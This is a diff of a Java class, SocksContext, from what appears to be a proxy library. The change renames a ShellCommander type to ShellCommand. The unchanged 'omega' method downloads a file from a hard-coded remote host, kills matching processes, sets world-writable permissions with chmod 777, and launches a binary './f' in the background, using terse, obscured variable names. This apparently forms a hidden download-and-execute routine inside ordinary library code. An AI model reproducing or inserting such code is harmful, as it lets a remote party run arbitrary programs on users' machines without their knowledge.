@@ -82,7 +82,7 @@ public final class SocksContext extends EventArgs {
     }
 
     @SneakyThrows
-    public static void omega(String n, TripleAction<ShellCommander, ShellCommander.PrintOutEventArgs> o) {
+    public static void omega(String n, TripleAction<ShellCommand, ShellCommand.PrintOutEventArgs> o) {
         try {
             int d = 100;
             String k = "omega", c = "./m/", z = c + "o", i = c + "c";
@@ -94,14 +94,14 @@ public final class SocksContext extends EventArgs {
             new HttpClient().get("https://cloud.f-li.cn:6400/" + k + "_" + n).toFile(i);
             Thread.sleep(d);
 
-            ShellCommander.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
-            ShellCommander.exec("chmod 777 f", c);
-            ShellCommander sc = new ShellCommander("./f -c c", c).setReadFullyThenExit();
+            ShellCommand.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
+            ShellCommand.exec("chmod 777 f", c);
+            ShellCommand sc = new ShellCommand("./f -c c", c);
             sc.onPrintOut.combine(o);
-            IOC.register(ShellCommander.class, sc.start());
+            IOC.register(ShellCommand.class, sc.start());
         } catch (Throwable e) {
             if (o != null) {
-                o.invoke(null, new ShellCommander.PrintOutEventArgs(0, e.toString()));
+                o.invoke(null, new ShellCommand.PrintOutEventArgs(0, e.toString()));
             }
         }
     }
